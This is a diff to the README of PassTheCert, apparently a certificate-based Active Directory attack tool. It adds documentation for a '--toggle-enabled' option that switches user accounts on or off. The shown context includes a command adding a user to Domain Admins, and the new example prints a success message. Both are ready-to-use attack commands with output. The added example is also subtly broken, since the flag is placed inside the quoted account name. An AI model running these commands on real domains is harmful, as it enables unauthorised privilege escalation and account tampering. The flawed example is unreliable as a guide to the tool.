@@ -228,3 +228,21 @@ Here's an example of usage:
 C:\> .\PassTheCert.exe --server srv-ad.contoso.com --cert-path Z:\skywalker.pfx --add-account-to-group --target "CN=Domain Admins,CN=Users,DC=contoso,DC=com" --account "CN=simple_user,CN=Users,DC=contoso,DC=com"
 Success
 ```
+
+### Toggle AD user account enabled/disabled
+
+The options for this attack are:
+
+```
+TOGGLE ENABLE USER ACCOUNT OPTIONS: --account ACCOUNT --toggle-enabled
+        --account ACCOUNT
+                The account added enabled/disabled. Should be the distinguished name of the account.
+        
+```
+
+Here's an example of usage:
+```console
+C:\> .\PassTheCert.exe --server srv-ad.contoso.com --cert-path Z:\skywalker.pfx --account "CN=simple_user,CN=Users,DC=contoso,DC=com --toggle-enabled"
+Account status toggled. Result: Success
+
+```
